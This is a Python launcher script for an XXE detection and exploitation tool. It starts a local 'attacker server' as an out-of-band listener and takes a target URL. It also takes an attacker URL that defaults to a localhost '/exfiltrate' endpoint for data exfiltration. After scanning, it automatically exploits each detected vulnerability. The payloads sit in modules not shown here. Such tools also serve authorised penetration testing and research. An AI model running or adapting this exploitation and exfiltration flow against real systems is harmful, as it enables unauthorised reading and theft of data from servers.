import argparse
import time
import pyfiglet
import threading
import subprocess
from colorama import Fore, init
from src.xxeDetector import XXEDetector
from src.xxe import OutOfBandListener
from config.logger_config import setup_logging

init(autoreset=True)

def print_banner():
    banner_text = "xxe master"
    font_style = "slant"
    banner = pyfiglet.figlet_format(banner_text, font=font_style)
    print(Fore.GREEN + banner)
    print(f"{Fore.YELLOW}***************************************************************")
    print()

def print_author_info():
    author_info = 'Author: El13 | ping me at: www.linkedin.com/in/elie-uwimana'
    print(Fore.GREEN + author_info)
    print()

VERSION = "1.0.0"

def start_attacker_server():
    """Start the OOB server in the background"""
    server_process = subprocess.Popen(['python', 'attacker_server.py'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    print(Fore.GREEN + "[*] Attacker server started on http://0.0.0.0:8000")
    return server_process

def stop_attacker_server(server_process):
    """Stop the attacker server gracefully."""
    server_process.terminate()
    print(Fore.RED + "[*] OOB server stopped.")

def main():
    print_banner()
    print_author_info()

    parser = argparse.ArgumentParser(prog='xmaster.py', usage='%(prog)s <url> [OPTIONS]', description="XXE Vulnerability Detection and Exploitation Tool.",
                                     epilog="For more information, visit https://github.com/uwimanaMuhiziElie/xxe_master.git")
    parser.add_argument('url', type=str, help='Target URL for XXE scanning')
    parser.add_argument('--attacker-url', '-Aurl', default='http://localhost:8000/exfiltrate', help='Attacker URL for data exfiltration')
    parser.add_argument('--delay', '-d', type=int, default=2, help='Delay between outputs in seconds')
    args = parser.parse_args()

    server_process = start_attacker_server()

    try:
        detector = XXEDetector(args.url)
        vulnerabilities = detector.detect_xxe_vulnerabilities(args.attacker_url)

        for vuln in vulnerabilities:
            print(Fore.RED + str(vuln))
            time.sleep(args.delay)

        if vulnerabilities:
            print(Fore.YELLOW + "[*] Exploiting detected vulnerabilities...")
            for vuln in vulnerabilities:
                detector.exploit_xxe(vuln['payload'])

    finally:
        stop_attacker_server(server_process)

if __name__ == "__main__":
    main()
